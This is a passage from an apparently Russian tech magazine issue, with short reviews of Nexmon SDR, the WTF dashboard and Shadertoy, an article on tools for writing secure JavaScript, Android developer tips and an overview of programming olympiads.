логинов и получим смартфон с большой буквы. Смартфон, который сразу
покажет всю нужную инфу без необ ходимос ти нажимать что бы то ни было.
Разве не так это дол жно работать?
   AIO Launcher — не про изведение искусс тва и не конкурент всем вашим
Nova лаунчерам, это приложение, которое просто делает работу со смартфо‐
ном удобной.





ВЫВОДЫ
Странно, что настолько очевидная простая идея существует в столь малых
вариантах. Странно видеть людей, «раз девающих» смартфон так, чтобы было
видно одни обои. Стран но, что мне вооб ще пришлось писать AIO Launcher,
вместо того чтобы пользоваться чем‐то готовым.
ТРЮКИ





                       Андрей Письменный
                         Шеф‐редактор
                           apismenny@gmail.com



     NEXMON SDR — ПРОГРАММА ДЛЯ ПРЕВРАЩЕНИЯ RASP-
      BERRY PI В SDR
       Работая над переводом  статьи о  том,  как можно превратить1        переходник с USB на VGA в передающее программно определя‐
       емое радио, я наткнулся на схо жий и не менее интересный про‐
         ект — Nexmon SDR. Это кас томная прошивка чипсета Wi‐Fi, которая
        наделяет «Малинку» новыми интересными возможностями.
          Авторы    утилиты   обнаружили,    что   чипы   Broadcom
       BCM4339 и BCM43455c0 можно при желании заставить передавать
       любой сигнал на частотах от 2,4 до 5 ГГц. Чип BCM4339 преиму щес‐
        твенно исполь зуется в телефо нах Nexus 5, а BCM43455c0 — в Rasp‐
         berry Pi 3B+ (в модели B без плюса стоит другой чип, с которым Nex‐
       mon SDR не заработает).





       Nexmon SDR предполагается использовать вместе с основным про‐
        ектом — Nexmon. Он представляет собой фреймворк для патчинга
        прошивки  чипа  Wi‐Fi  с  целью, например,  наделить  его  воз‐
       можностью перехвата пакетов и инжекта фрей мов. Он, кстати, под‐
       держивает гораздо большее число устройств, включая Huawei
       P9 и некото рые Samsung Galaxy.
          Что до Raspberry Pi, то ее можно превратить в радиопередатчик
        и при помощи другой утилиты — rpitx. Она подает сигнал от 5 кГц
       до 1500 МГц на пины GPIO, к которым можно подключить антенну.
          Экспе риментируя со всем  этим, не  забывай,  что вещание
        без лицензии за предела ми экранированного помещения может
        быть незаконным.


      WTF — УНИВЕРСАЛЬНЫЙ ДАШБОРД ДЛЯ НАСТОЯЩИХ
      ФАНАТОВ ТЕРМИНАЛА2      Может показать ся, что вся кие виджеты и гаджеты — это удел раз‐
        весистых графических интерфейсов, авторы которых уже не знают,
         что бы еще приделать к операционной системе. Однако некоторые
        поклонники командной строки Linux тоже не чужды легкомысленных
        развлечений. Впрочем, кра сиво оформлен ную при борную панель
       можно считать и практичной — смотря что на нее пос тавить.





                               Как должно быть

       Предмет разговора — утилита под названием WTF. Это модульный
       дашборд, элементы которого ты выбира ешь сам — в соответствии
        с твоими нуждами и раз мерами монитора. Например, можешь
        вывести себе статистику по проекту в GitHub или GitLab, показывать
         таски из Jira и Trello, добавить информацию о заряде батареи, пос‐
         тавить  красивый  прогноз  погоды,  курсы  криптовалют и даже
        добавить ту‐ду‐лист и заполнять его прямо на месте.
         Помимо это го, WTF можно интегрировать с дру гими программа‐
       ми — например, через текстовый файл (модуль Textﬁle) или через
        стандартный вывод (модуль CmdRunner). Для облачной интеграции
       можно  использовать  ячейки  в  таб лицах  Google  Spreadsheets:
        при помощи IFTTT в них удобно складывать информацию, получен‐
       ную от других cервисов через API.
        Однако, когда я принялся с энтузиазмом настраивать свой даш‐
        борд, меня ждало некоторое разочарова ние.





                                  WTF?!

       Нормально отоб разился только вывод из текстового файла, куда
        специальный скрипт скла дывает курсы доллара и евро. А вот прек‐
        расный прогноз погоды из wttr.in отоб ражается битым. С Google
        Spreadsheets тоже не задалось: пос ле подключения модуля WTF
         стал предлагать мне вставить из буфера обмена ключ разработчика,
        но потом жаловался, что ключ не подходит.
         Придется теперь не забыть вернуться к этой шту ке через годик
        и посмотреть, как продвига ется раз работка!


      SHADERTOY — РЕДАКТОР ШЕЙДЕРОВ, КОТОРЫЙ
      РАБОТАЕТ В БРАУЗЕРЕ3   Современные бра узеры без проб лем отображают трехмерную гра‐
        фику в формате WebGL, хотя на обычных сайтах такое раз влечение
        пока что встречается и очень редко (да что там, почти никогда). Вос‐
        полнить нехватку кру того 3D в орга низме, а также оценить мощь
        современных технологий и попробовать самостоятельно поиграться
        с шейдерами поможет сервис Shadertoy.





       Смысл Shadertoy довольно прост: пользователи могут писать шей‐
       деры на языке GLSL и тут же видеть, как будет выглядеть результат
        работы программы. А затем выставить свое творение на суд общес‐
        твенности, чтобы соб рать лайки и комментарии. Лучшие работы
        попадают в топы.





       Смотреть их, кста ти, одно удовольствие. Чего только не делают
        при помощи шейдеров! Рису ют при митивы и даже це лые сцены,
        генерируют приятные спецэф фекты и за вораживающие ландшаф ты.
         Кто‐то даже  написал подобие игры  Wolfenstein 3D —  всего
        на каких‐то 440 строк.
          Если захочешь разоб рать ся, как все это работает, то можешь
         изучать и пробовать менять чужой код прямо на месте. Ну а более
       фундамен тальные зна ния можешь почерпнуть, например, на сайте
        WebGLFundamentals, там есть неп лохая статья о шейдерах и GLSL.
КОДИНГ

   БЕЗ ОПАСНЫЙ
     JAVASCRIPT

                 ИЗУЧАЕМ ПРОБЛЕМЫ
              КОДА НА JS И ВЫБИРАЕМ
                   СРЕДСТВА БОРЬБЫ
                         С НИМИ





                                                                        Анна Серохвостова
                                                                                                  anna.barnaul@list.ru





Разработка безопасных приложений на JavaScript — весьма
непростое занятие. Но выполнимое. В этой статье рассмот‐
рим  особенности  JavaScript,  из‐за  которых  возникает
наибольшее количество проблем, и обратим внимание
на инструменты разработчика, которые помогут их избе жать.




ПЯТЬ ПРИЧИН, ПОЧЕМУ СЛОЖНО ПИСАТЬ
БЕЗОПАСНЫЙ КОД НА JS


1. Компилятор не поможет
JavaScript — интерпретируемый язык. А это значит, что компилятор не будет
все время на что‐нибудь жаловать ся, отказыва ясь работать и подталкивая
тебя поправить ошибки и оптимизировать код.


2. Динамическая суть JavaScript
JavaScript динамический, слаботипизи рованный и асинхронный. А это все
признаки того, что попасть в беду легче легкого.
  Язы ковые средства вро де eval и включения стороннего кода через
script src позволяют исполнять строки пря мо в рантайме. Как следс твие —
сложно дать «статические гарантии» того, что код будет вести себя опре‐
деленным образом. Динамичес кий анализ это тоже затрудня ет (см. научную
работу).





                      Использование eval

  Слабая типизация приводит к тому, что применять устоявши еся методы
статического анализа непросто — по край ней мере в сравнении со статичес‐
ки типизированными языками (нап ример, Java).
  Асин хрон ные кол бэки, вызовы которых JavaScript допускает через
механизмы вроде setTimeout и XMLHttpRequest (тот самый знаменитый AJAX),
по статистике прячут в себе больше всего коварных ошибок.


3. Замысловатые воз можности JS
Чего только не притащили в JavaScript с годами! В частности, в нем есть про‐
тотипы, функции первого клас са и за мыка ния. Они делают язык еще динамич‐
нее, а написание безопас ного кода — слож нее.
  Про тотипы. Смысл их в том, что программы пишутся в духе объ ектно
ориентированного подхода, но без использования классов. При таком под‐
ходе объекты наследуют необ ходимые им свойства напрямую от других объ‐
ектов (прототипов). При этом в JS прототипы могут быть переопределены
прямо в рантайме. И если это переопределение случилось, то эффект сразу
же распространяется на все объекты, которые наследуют свойства пере‐
определяемого прототипа.





                    Как обрабатываются прототипы

Справедливости ради надо сказать, что в новых спецификациях ECMAScript
классы тоже присутствуют.
  Фун кции первого класса. У JS очень гиб кая модель объектов и фун‐
кций. Свойства объектов и их значения могут быть соз даны, изменены
или удалены прямо в рантайме, и ко всем есть доступ через функции первого
класса.
  Замыкания. Если объявить функцию внутри дру гой функции, то первая
получает доступ  к переменным и  аргументам последней. Причем  эти
переменные продол жают существовать и оста ются доступными внутренней
функции — даже после того, как внешняя функция, в которой эти переменные
определены, завершилась.
   Из‐за такой гибкости и динамичности JavaScript определение набора всех
доступных свойств объекта при ста тичес ком ана лизе — неразрешимая
задача. Однако веб‐раз работчики повсеместно используют динамические
особенности языка, а соответственно, пренеб регать ими при анализе кода
нельзя. Иначе какая тут гарантия безопас ности?


4. Тесное взаимо действие меж ду JavaScript и DOM
Это нужно, чтобы обеспечить «бесшовное» обновление веб‐страницы, прямо
в рантайме. DOM, как извес тно, представляет собой стандартную объектную
модель, нейтральную по отношению к платформам и язы кам, которая пред‐
назначена для отрисовки документов HTML и XML. У DOM есть собственный
API для работы с отоб ражаемым документом: для динамического доступа,
перемещения и обновления отоб ража емо го документа (его содержимого,
структуры и стиля). Изменения в DOM могут вноситься динамически, через
JavaScript. И эти изменения сра зу же отоб ража ются в браузере.
   Благодаря DOM загруженные в браузер веб‐страницы можно обновлять
поэтапно по ходу подгруз ки данных с сервера. Одна ко у такого удобства есть
и оборотная сторона: фрагменты кода, которые отвечают за динамическое
взаимодействие между JS и DOM, особен но подвержены ошибкам.





        Наибо лее распространенные ошиб ки в веб‐приложениях


5. Слож ные событийные взаимо действия
JavaScript — это язык, управляемый событиями (event‐driven). Он позволяет
разработчикам регистрировать на узлах DOM так называемых «слушате лей
событий» — event listeners. И хотя большинс тво событий вызываются дей‐
ствиями пользователя, существу ют и такие, которые могут быть иницииро‐
ваны и без этого, — например, события по времени и асинхронные вызовы.
При этом каждое событие может отда ваться эхом по все му дереву DOM
и активировать сразу нес колько «слушателей». Иногда отследить все это —
довольно нетривиальная задача.





                     Как обрабатываются события

По этим причинам код на JS может быть тру ден для понимания, анализа
и тестирования. Облегчат жизнь веб‐раз работчику и помогут писать безопас‐
ный код специальные утилиты.




УТИЛИТЫ ДЛЯ ТЕСТИРОВАНИЯ КОДА НА JS


Существуют утилиты для парсинга (например, Esprima, Rhino), оптимизации
(например, Google Closure Compiler) и статичес кого анализа кода на наличие
распространенных синтаксических ошибок (например, JSHint).
  Кроме того, есть нес коль ко проверенных фреймворков, которые помога‐
ют веб‐разработчикам покрывать JS‐код тестами. Сре ди них:
 • QUnit — популярный фреймворк для тестирования модулей;
 • Jasmine — BDD‐фреймворк (Behavior‐driven Development) для тестирова‐
   ния кода;
 • Mocha — фреймворк для тес тирования кода, запус кается как в Node.js, так
   и в браузере;
 • jsTestDriver — фреймворк, который в числе прочего может прогонять набор
   тестов сразу через нес колько бра узеров.

Кроме  того, существуют тес тирующие фрей мворки, которые эмулируют
поведение браузера и поз воляют автоматически прогонять тестовые при‐
меры. Они особенно актуальны при отладке участков кода, которые отве чают
за взаимодействие между JS и DOM, и предоставляют удобную инфраструк‐
туру для манипулирования DOM.
  К примеру, Selenium, PhantomJS и SlimerJS предоставляют API, через
который можно запускать экземпляры браузера и работать с ними. Через API
ты можешь активировать события и получать доступ к элементам DOM пря мо
в рантайме — то есть тес тировать код в условиях, максимально приближен‐
ных к реальным. Конеч но, немалую часть работы придется проделывать вруч‐
ную, но даже это уже неплохая помощь в тестировании.




УТИЛИТЫ ДЛЯ СТАТИЧЕСКОГО АНАЛИЗА


Ранее утилиты для выявления проблемных участков кода представляли собой
статические анализаторы. То есть, учи тывая все динамичес кие причуды JS,
могли предоставить только огра ниченную помощь. Однако и они бывают
полезными в анализе. Вот нес колько основных примеров.
  WARI — статический анализатор, который исследует зависимости между
функциями JS, стилями CSS, тегами HTML и изображениями. Смысл этой ути‐
литы — находить при статическом анализе неисполь зуемые ресурсы. Однако
с динамикой WARI, конечно, не спра вится.
   JSLint — утилита для ана лиза статического кода, которая сама написана
на JavaScript. Она проверяет код на соответствие хорошим практикам.
   Google  Closure  Compiler — JS‐оптимиза тор, который автоматически
переписывает код с целью сделать его быстрее и компактнее. Заодно в трубу
вылетают все комментарии и любые неиспользуемые учас тки кода.
   WebScent (см. научную работу) — продвинутый статический анализатор.
В работе он исходит из того, что клиентский JS‐код (тот, который загружается
в браузер) не хранится на стороне сервера в целом виде, а рассеян по сер‐
верному коду кусками. «Душок» в этих кусках не может быть легко обнаружен
до тех пор, пока из них не будет сгенерирован цель ный клиентский код. Web‐
Scent анализирует клиентский код с тем, чтобы найти проблемные места
в серверном коде. При этом работа статического анализатора WebScent
в основном сводится к распутыванию замесов HTML, CSS и JS — с целью
обнаружить дублирующийся код и ошиб ки в синтакси се HTML.




УТИЛИТЫ ДЛЯ ДИНАМИЧЕСКОГО АНАЛИЗА


JSNose — утилита, в которой объединены статический и динамичес кий ана‐
лиз. Она анализирует код на наличие тринадцати антипаттернов. Семь из них
(в том числе lazy object и long function) — общие для всех языков программи‐
рования, а шесть остальных (closure smells, excessive global variables, nested
callbacks и другие) специфичны для JavaScript.
   DOMPletion — автоматизированная утилита, которая помогает веб‐раз‐
работчику понимать код при прос мотре: объясня ет причину присутствия
структур DOM, выполняет динамический анализ, а также предоставляет
умный автокомплит для кода, который взаимодей ствует с DOM.
   Clematis — фреймворк, который помогает распутывать сложные событий‐
ные взаимодействия. Clematis детально фиксиру ет все события, которые сра‐
батывают при выпол нении, и визу ализиру ет их в виде абс трактной поведен‐
ческой модели, в которой отражаются временные и причинно‐следственные
связи между компонентами и событиями.




ВЫВОДЫ


Итак, отследить происхо дящее при выполнении скриптов на JS бывает неп‐
росто, но, вооружившись подходящими инстру ментами, найти и переписать
проблемные места можно даже в самом запутанном коде. Впрочем, Java‐
Script не стоит на месте: в нем появляются новые и новые возможности,
теперь он часто исполь зует ся для написания при ложений (как мобильных, так
и десктопных), а также все чаще встречается на серверах (и не только) бла‐
годаря Node.js. А это зна чит, что и искусс тво ловли багов нужно выводить
на новый уровень.
КОДИНГ





                                                                              Евгений Зобнин
                                                                                    Редактор Unixoid и Mobile
                                                                                                  zobnin@glc.ru

        СОВЕТЫ
        ANDROID-
   РАЗРАБОТЧИКУ

        ЧТО Я УЗНАЛ ЗА ГОД ПОДДЕРЖКИ
          ПРИЛОЖЕНИЯ В GOOGLE PLAY





Вот уже год я занимаюсь поддержкой приложения в Google
Play. За это время приложение установили сотни тысяч раз,
а пользовательская база разрослась до десятков тысяч.
Каждый день я получаю отзывы и письма, сооб щения
об ошибках и пишу код. Эта статья — советы для тех, кто
только начинает свой путь в Google Play и желает сохранить
хотя бы часть головы свободной от шишек.


НАУЧИСЬ ПРАВИЛАМ ГИГИЕНЫ
За годы существования Google Play в нем сформировал ся собственный
набор «правил жизни», которому теперь подчиня ются и пользователи, и раз‐
работчики. Вот часть этих пра вил.
   Если хочешь быстро получить ответ от разработчика, просто напиши
вопрос и поставь одну звезду. Такая модель поведения появилась благода‐
ря крупным разработчикам с собственной службой поддержки, которая прос‐
то обязана отве чать на все отзывы с пло хими оценками (они обычно пишут
тошнотворное «Мы рады, что вы скачали наше приложение» в начале каждого
ответа). Таких ребят лучше игнорить, после получения ответа они не исправят
оценку.
  Ты ничего не умеешь, сидишь на шее у родителей и чувствуешь себя
никем? Просто напиши гадость в отзывах. Опять же игнор, плюс жалоба
Google (это легко, достаточно нажать на фла жок). Отзы вы с матом Google
удалит сам.
   Купил китайское гуано вместо телефона? Виноваты разработчики при-
ложений! Android настоль ко фрагментирован, что, даже если ты вылизал при‐
ложение до блеска, оно все равно будет работать криво на десятках и сотнях
моделей телефо нов. Выхода из ситуации два: первый — объяснять каждому
пользователю, как обойти его проблему на конкрет ном телефоне, второй —
пойти по пути разработ чиков VLC. Они, напомню, просто заблокировали
половину моделей Huawei, потому что механизм энергосбережения этих
смартфонов прибивал плеер во время просмотра видео.





                    А вот так делать не стоит


ХОРОШАЯ ТЕХПОДДЕРЖКА НЕ МЕНЕЕ ВАЖНА, ЧЕМ ХОРОШИЙ
КОД
Многие айтишники нелюдимы и обла дают высоким уровнем ЧСВ. В обычной
жизни мы считаем это своей фишкой и не испытываем серьезных проблем.
Но все меняется, когда нам приходит ся работать в команде, а еще хуже —
выпол нять работу техничес кой поддержки.
  Общение с технически неграмот ной аудитори ей может быть очень болез‐
ненным и стоить миллионы нервных клеток. Но это совсем не значит, что
пользователей нужно игнорить и уж тем более посылать куда подальше.
  Я получаю десятки писем в день. Пользователи спрашивают меня,
как включить функцию, включатель которой находится в самом верху окна
настроек. Они спрашивают, почему я не реализую поддержку WhatsApp, хотя
я отвечал на этот вопрос уже пять десят раз и даже включил его в FAQ. Многие
пользователи просят добавить определен ную функциональность, а некото‐
рые покрывают матом, когда я отка зываю.
  Я стараюсь отвечать всем, независимо от того, насколько банальный воп‐
рос задает пользователь. Есть только два способа сделать так, чтобы я
намеренно не отве тил: написать не имеющее отношения к приложе нию пись‐
мо и начать спамить одинако выми вопросами. Остальным: добро пожало‐
вать.
   Благодаря такому отно шению выиг рыва ют все. И раз работчик, который
имеет множество преданных пользователей, и сами пользовате ли, которые
в любой момент могут получить ответ на любой вопрос или сооб щить о баге,
чтобы разработчик исправил его в ближайшем обновлении.


НИЧЕГО НЕ ОБЕЩАЙ
Самая большая ошибка, которую я совершил, общаясь с пользователями
в Google Play, — это обещание реализовать определенную функциональ‐
ность. Человек оставлял отзыв, в котором писал, что все вроде бы хорошо,
но хотелось бы вот такую функцию. В ответ на это я говорил, что идея
хорошая и я ее реализую. Через неделю тот же пользователь менял оценку
на единицу с пояснением, что я не выполняю обещания.
  Нетехнари видят реальность совсем не так, как мы. Для многих ничего
не понимающих в разработке людей добавить новую функци ональность —
это все равно что сходить в туалет: открыл код, добавил функцию, закрыл код.


НИКТО НЕ ЧИТАЕТ ДОКУМЕНТАЦИЮ
Банальщина, не так ли? Но только если речь идет не о пользовате лях мобиль‐
ного софта. Они не прос то не читают документацию, они не читают вообще
ничего. Ни описание приложения в маркете, ни встроенную в приложе ние
максимально краткую документацию, ни подсказки. Добрая половина поль‐
зователей пропустит даже визард пер вого запус ка из трех кратких пред‐
ложений, которые просто невозможно не заметить и не успеть прочитать.
   Что с этим делать? Конечно же, пос тарать ся сделать интерфейс приложе‐
ния настолько понятным, чтобы никакие пояс нения прос то не требовались.
Проблема только в том, что это не всег да возможно сделать. Эффективность
использования и наглядность интерфейса пересекаются не так уж час то, и во
многих ситуациях без пояснений просто не обой тись. Ты будешь пояс нять эти
моменты в ответных пись мах, в отзывах на Google Play, на форумах. Снова
и снова, снова и снова.


НЕ ТОРОПИСЬ, НЕ ТОРОПИСЬ, НЕ ТОРОПИСЬ
За время разработки приложения у меня сложилась стойкая привычка про‐
сыпаться в час ночи. В это время в Америке день, а значит, это самое лучшее
время проверить в почте сооб щения о багах, найденных пользователями
в опубликованной вчера версии. Я мог бы похвастаться тем, насколько быс‐
тро я реагирую на сообщения об ошиб ках. Но на самом деле это означает
лишь то, что я постоянно тороплюсь с релизом.
  Поспешность в разработке ПО — твой самый коварный враг. Все мы
хотим как можно скорее зарелизить новую версию с так давно ожидаемыми
функциями, лишенную дос тавших всех недора боток. И всем нам кажется, что
уж в этот‐то раз мы предус мотрели действительно все и багов точно нет.
А дальше все как обыч но: релиз, баг, багфикс, ушедшие пользователи.
  Однажды я выпустил баг фикс‐релиз всего с тремя измененными стро‐
ками. На следующий день пользователи обнаружили проблему совершенно
в другом месте, и когда я все‐таки нашел ее причину, то еще долго уве рял
себя, что такого просто не может быть.
   Всегда тестируй и тща тельно проверяй новые версии. Даже если тебе
кажется, что это исправление точно ни на что не влияет, оно может иметь
очень неожиданные сайд‐эффекты.


НЕ ДЕЛАЙ БЫСТРО, ДЕЛАЙ ПРАВИЛЬНО
Даже самую правильную и кра сивую архитектуру можно уничтожить, без‐
думно добавляя новую функциональность. Сначала тебе кажется, что неболь‐
шое отклонение от дизайна не соз даст проблем. Затем ты добавляешь вто‐
рую не согласующуюся с архитектурой функцию. Затем исключения становят‐
ся правилом, и вот ты уже не можешь разобрать ся в собственном коде,
а количество неисправленных багов растет в геометричес кой прогрессии.
   Чтобы избежать это го, дос таточно купить блокнот и накидывать в нем план
реализации новой функциональнос ти. Блок‐схемы и даже просто списки быс‐
тро расставят все по своим местам и поз волят внедрить новые функции без‐
болезненно и без нарушения общей архитектуры.


ЛУЧШЕ МАЛО ПРЕВОСХОДНО РАБОТАЮЩИХ ФУНКЦИЙ, ЧЕМ
МНОГО НЕДОРАБОТАННЫХ
У каждого инди‐разработ чика в голове есть куча идей, которые он хотел бы
реализовать в своем приложении. Но, пытаясь реализовать их все, ты рано
или поздно столкнешься с проблемой неп роработанности. При ложе ние
будет набито сырыми, а потому бесполезными функциями, которые отпугнут
существующих пользователей, а не привлекут новых.
   Чтобы довести до ума одну функцию, может понадобиться масса сил
и времени. Но оно стоит того. Пользователи ценят продуманные, закон‐
ченные приложения.


НЕ ДОВЕРЯЙ ЧУЖОМУ КОДУ
Stack Overﬂow пол ностью изменил подход к написа нию приложений. Сегод‐
няшние программисты не читают документацию и не ведут многочасовые
беседы с коллегами. Они идут на SO и прос то копируют ответ, набравший
большее количество голосов. Выбор биб лиотек зачастую не более сложный:
где звездочек на GitHub больше, то и лучше.
   Что мы получаем в результате? Забагованные, уязвимые и медленные
приложения. Большое количество голосов или звездочек не означает, что код
корректен. Снип пет кода мог уста реть; те, кто ставил оценки, могли не брать
в расчет безопасность и скорость; в конце концов, код может просто
не подойти для твоей конкретной ситуации.
   То же самое касается библиотек. Не все раз работчики настолько опытные
и продвинутые, как ребята из Square. Прог раммис ты делают ошибки, недос‐
таточно тестируют биб лиотеку, не обновляют ее к текущим реалиям, ну
или просто забрасывают.
   Всегда тщательно тес тируй любой код, который ты включаешь в при ложе‐
ние. Читай комментарии на SO, анализируй код, просматривай баг‐репорты
на GitHub, посмотри, ког да был сделан последний коммит, и внимательно
следи за нововведениями Android. Они могут сломать не только твой, но и
чужой код.





  При работе с множеством изображений Blurry будет крашить твое при‐
  ложение каждые две минуты


НИКТО НЕ БУДЕТ ТЕСТИРОВАТЬ БЕТА-ВЕРСИЮ
Отсутствие профессионального бета‐тес тирова ния — одна из основных
проблем инди‐разработчиков. Часто мы прос то не можем позволить себе
нанимать профессионалов и поэтому прибегаем к помощи друзей, родствен‐
ников и соседей. Результат обычно получается плачевным, и мы ищем способ
расширить аудиторию тестеров за счет самих пользователей.
   Google Play позволя ет загружать три различные версии при ложе ния: аль‐
фа, бета и стабильная. И кажется, что это именно то, что нам нужно: прос то
загружаем бету, и пусть ее уста навливают все, кто хочет, и отпи сываются
о проблемах.
   Вот только отписываться о проблемах никто не будет. Пользователи ста‐
вят бета‐версию вовсе не для того, чтобы ее тес тировать, а чтобы получить
новые функции быстрее дру гих. Для многих пользователей баг в бета‐вер‐
сии — это что‐то впол не обычное и не вызыва ющее возмущения или желания
сообщить. Даже если бета‐тес теров тысяча человек, о багах тебе сообщит
только один.
  На самом деле даже пользователи стабильной версии приложения
искренне полагают, что ты уже зна ешь о существовании найденного ими
бага. А не исправляешь ты его потому, что не можешь или не уме ешь.


НЕВОЗМОЖНЫЕ БАГИ ВОЗМОЖНЫ
За время поддержки приложения ты наверняка не раз столкнешься с людьми,
которые запустят твое приложение в нес тандартных и не предназначенных
для него условиях и будут отписывать ся о багах. Самый простой пример: при‐
нудительно перевернуть приложение в ландшафтный режим при том, что оно
должно работать только в портретном.
  Можно только гадать, какие цели прес ледуют такие пользователи, но со
временем они научат тебя игнорировать невозможные баги. И будь уверен,
именно в этот момент появится настоящий невоз можный баг, который зат‐
рагивает не только людей со странностя ми.
  Ты уже три раза проверил код и не смог повторить его на всех эмуляторах
и смартфонах? Проверь код еще три раза и в этот раз запусти приложение
на всех‐всех эмуляторах и смартфонах.


ГОТОВЬСЯ К ПРОБЛЕМАМ
Когда ты только начинаешь изу чать программирование для Android, тебе
кажется, что здесь все прос то и понятно. Но чем доль ше ты этим занимаешь‐
ся, тем больше понимаешь, нас колько все сложно и запутанно. Android
появился как опе рационная система для классического типа смартфонов,
напоминающих старые BlackBerry: небольшой экран, QWERTY‐клавиатура,
простые приложения. А затем его в срочном порядке начали переделывать
в нечто вроде iOS. Через несколько лет приложения внезапно стали намного
сложнее. А потом мир изменился снова.
   Google постоянно переделыва ла Android, добавляя в него все новые API,
которые могли работать сообща со ста рыми или конфликтовать с ними. В то
же время расширялся список устройств, а старые версии Android все никак
не устаревали. Появились биб лиотеки поддержки, приз ванные помочь в раз‐
работке для разных версий ОС, а на деле еще более ее усложняющие.
  Современный Android — это сборная солянка, программи руя для которой
необходимо учитывать огромное количес тво нюансов. Тебе придется при‐
обрести десяток различных устройств для тестирования, прочитать массу
документации, провести сотни экспериментов. Поэтому, если ты только
в начале пути, стоит крепко задумать ся о том, нужно ли тебе это.


ТВОЕ ПРИЛОЖЕНИЕ СВОРУЮТ, СМИРИСЬ
Никому не нравится, когда результат его многолет них трудов просто берут
и бесплатно раздают всем желающим. Но это реальность, и в мире Android
она более реальна, чем где бы то ни было. Ты можешь применять обфуска‐
торы, защищать приложение пакера ми, валиди ровать покупки на собс твен‐
ном сервере, но приложение все равно украдут. И тебе повезет, если из него
просто сделают варез, а не встроят полноэкранную рекламу или внедрят бэк‐
дор.
  Я получил десятки писем от индийцев, которые жаловались, что, несмотря
на покупку приложения, оно все равно показывает пол ноэкранную рекламу.
Стоит ли говорить, что рекламы в приложении не было вообще?
   Как с этим бороться? Никак. Это один из багов экосис темы Android.
Единственный вариант — ежедневно находить в гугле ссыл ки на пиратские
версии своего приложения и писать жалобы.





         Очередной индиец сооб щает о рекламе в при ложе нии
КОДИНГ

ОЛИМПИАДЫ
 ПО ПРОГРАММИРОВАНИЮ





           КУДА ПОДАТЬСЯ,
        ЕСЛИ ТЫ МОЛОД, УМЕН
        И ХОЧЕШЬ ВЫИГРАТЬ
     НЕСКОЛЬКО ТЫСЯЧ ДОЛЛАРОВ





Олимпиады бывают школьными и скучными,
а бывают всемирными и ува жаемыми. Учас‐
тие в них как минимум инте ресно, поз‐
навательно  и  способствует  заведению
полезных знакомств в про фессиональных       Денис Колисниченко                                                                                 Постоянный автор журнала
кругах, как максимум — приводит к попол‐           dhsilabs@gmail.com«Хакер»
нению твоего кошелька на несколько тысяч
долларов, а резюме — строчкой работы
на хорошей должности в международной
корпорации. О том, что они собой пред‐
ставляют, где про водятся и сколько можно
заработать в случае победы, — в этой
статье.


Семь лет назад «Хакер» уже рассказывал о чемпионатах по программирова‐
нию. С тех пор много что поменя лось — попробуем разобраться.


ACM/ICPC
Традиционно начинаем обзор с самой извес тной и самой древней студен‐
ческой олимпиады по прог раммированию. Корни этого мероприятия уходят
в семидесятые годы прошлого века. Современный облик оно приобре ло
в 1977 году, с тех пор проводится ежегодно. Рань ше принять учас тие могли
только студенты из США и Канады, но со временем олимпиада стала всемир‐
ной, и, что самое интерес ное, последние семь лет (с 2012 года) ее победи‐
телями становят ся студенты из России. Всего с 2000 года чемпионский кубок
ACM/ICPC побывал в Рос сии тринадцать раз. Кста ти, с конца девяностых
ни разу студенты из США не побеждали в олимпиаде. Основать основали,
а вот программировать так и не научились. :)





             Финал ACM/ICPC 2018, Пекин, Китай

ACM/ICPC — соревнование командное. Команда состоит из трех человек,
участвовать могут студенты вузов и аспиранты первого года обу чения — глав‐
ное, чтобы возраст не превышал 25 лет. Не допускаются студенты, пятик‐
ратно принимавшие учас тие в олимпиаде или же дважды попадавшие
в финальную стадию. Пра вила олимпиады неиз менны: за пять часов прог‐
раммисты должны решить от вось ми до двенадцати алгоритмических задач
(условия написаны, естес твенно, на английском). Из года в год меняется
только список допустимых языков программирования. В 2018 году в нем
были C, C++, Java, Kotlin и Python. Ранее был дос тупен и Pascal, но теперь он
закономерно ушел в прошлое.
  Результаты отправляются на тестиру ющий сервер, где проверяются. Если
еще есть время, а задача решена неправильно или не соблюдены ограниче‐
ния по времени выполнения и используемой памяти, то об этом сооб щается
команде, и она может провес ти работу над ошиб ками. Побеждает команда,
справившаяся с наибольшим числом задач. Если несколько команд решили
одинаковое число задач, то побеждает та, которая сделала это быстрее.
  В этом году впервые чемпионский кубок уехал в Москву — победителем
стала команда из МГУ. В составе команды — Михаил Ипатов, Владислав
Маке ев и Григорий Рез ников. До этого кубок, как эстафетная палочка,
переходил от Университета ИТМО к СПбГУ и обратно.
  Поскольку олимпиада международная, то мес то ее проведе ния каждый
год меняется. В этом году она проходила в Китае, в прошлом — в США,
а в 2013‐м и 2014‐м — в Санкт‐Петербурге и Ека теринбурге соответственно.
   Теперь о профите. Команда‐победитель в этом году получи ла 15 000 дол‐
ларов, команды, завоевавшие золотые медали (первые четыре места), —
по 7500 долларов, серебряные медали (5–8‐е места) — по 6000 дол ларов.
А утешительный приз (10–12‐е мес та) сос тавляет 3000 дол ларов — для обла‐
дателей бронзовых медалей. Впро чем, день ги здесь не главное. Учас тие
в этой олимпиаде — шанс получить высокооплачиваемую работу и даже
встретиться с президентом РФ.


ЯНДЕКС.АЛГОРИТМ
Яндекс.Алгоритм — это международный чемпионат по спортивному прог‐
раммированию. Участвовать может каж дый, кто умеет решать алгоритмичес‐
кие задачи и знает один из тринадцати допустимых язы ков программирова‐
ния. Других ограничений, в том числе возрастных, нет. Тематика задач чем‐
пионата меняется из года в год, в 2018‐м упор был сделан на оптимизацию
и машинное обучение.





                  Чемпионат Яндекс.Алгоритм

Соревнования  состоят  из  нес кольких  отборочных  раундов,  в  каждом
из которых нужно решить пять задач за 100 минут, и финала, в который
попадают 25 человек, показавших лучшие результаты. Призеры чемпионата
получают денежные призы. Кстати, о призах. В 2018 году призовой фонд чем‐
пионата составил солидные 980 тысяч рублей.
  Победителем в этом году стал Геннадий Короткевич (Белоруссия), второе
место занял Алексей Данилюк, а на третьем — Михаил Ипатов (призер
ACM/ICPC).
   Пять причин попробовать учас твовать в чемпиона те в следующем году:
 • нет ограниче ний по воз расту и принадлежности к вузу;
 • широкий выбор языков программирова ния;
 • возможность завести полезные зна комства — Яндекс.Алгоритм ежегодно
   собирает луч ших программистов международного клас са;
 • возможность зарабо тать солидную сумму;
 • минимальные затраты со стороны участника (тебе не придется выез жать
   за пределы страны, не нужен загранпас порт, визы и прочее).

На наш взгляд, Яндекс.Алго ритм даже интерес нее, чем ACM/ICPC. Во‐пер‐
вых, меньше всевозможных ограничений, мешающих участию, во‐вторых,
можно участвовать одному. И если в ACM/ICPC приз делится между все ми
членами команды, то здесь он принадлежит тебе и только тебе. А приз
немалый —  за  первое  место  в  алгоритмическом  треке  можно
